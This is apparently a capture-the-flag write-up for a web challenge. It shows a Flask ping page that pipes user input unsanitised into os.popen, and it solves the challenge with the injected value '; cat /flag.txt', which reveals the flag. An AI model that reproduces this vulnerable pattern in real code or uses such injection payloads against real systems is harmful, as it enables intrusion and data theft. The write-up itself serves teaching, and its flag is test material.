## Description

> I made this cool website where you can ping other websites!

### Attached

[pingpong.zip](attached/pingpong.zip)

This is ```pingpong.py``` file

```py
from flask import Flask, render_template, redirect, request
import os

app = Flask(__name__)

@app.route('/', methods = ['GET','POST'])
def index():
    output = None
    if request.method == 'POST':
        hostname = request.form['hostname']
        cmd = "ping -c 3 " + hostname
        output = os.popen(cmd).read()

    return render_template('index.html', output=output)

```

## Analyzation

When receiving ```hostname``` from the ```POST``` method, the command will be executed without validating the data from ```hostname```
```py
cmd = "ping -c 3 " + hostname
output = os.popen(cmd).read()
```

This leads to [command injection](https://owasp.org/www-community/attacks/Command_Injection).

## Solution

Send POST request with the ```hostname``` value
```
; cat /flag.txt
```

The flag is
```
LITCTF{I_sh0uld_b3_m0r3_c4r3ful}
```
